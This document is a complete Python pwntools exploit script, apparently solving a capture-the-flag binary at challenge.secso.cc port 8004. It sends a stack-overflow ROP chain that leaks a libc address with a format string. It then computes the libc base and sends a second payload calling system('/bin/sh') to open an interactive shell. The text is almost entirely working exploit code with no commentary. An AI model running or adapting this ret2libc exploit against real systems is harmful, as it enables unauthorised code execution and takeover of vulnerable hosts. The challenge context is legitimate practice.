from pwn import *             

context.log_level = 'warn' 

context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 

HOST="nc challenge.secso.cc 8004"
ADDRESS,PORT=HOST.split()[1:]

BINARY_NAME="./chal"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

libc  = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    

printf_plt=binary.plt.printf
gets_plt=binary.plt.gets
main=binary.sym.main
payload = 32 * b'A' + p64(0) + p64(gets_plt) + p64(printf_plt) + p64(main)
p.sendlineafter(b'Hello! Pleasure to meet you! Please enter your name:', payload)

fmt =b"%3$p "
p.sendline(fmt)
p.recvline()
recv = p.recvline().strip()
leaked_bytes = recv.split(b'\x1fHello!')[0]
leaked_addr = int(leaked_bytes,16)
warn (f"\"%3$p \" {leaked_addr:#x}")

libc.address=leaked_addr-0x2038e0

bin_sh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" string in libc
system = libc.sym['system']             # Find system() function address

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Find "pop rdi; ret" gadget

warn(f"pop rdi; ret: {pop_rdi:#x}")
warn(f"/bin/sh: {bin_sh:#x}")
warn(f"system: {system:#x}")

payload2 = 32 * b'A' + p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendline(payload2)
# gdb.attach(p)
p.interactive()
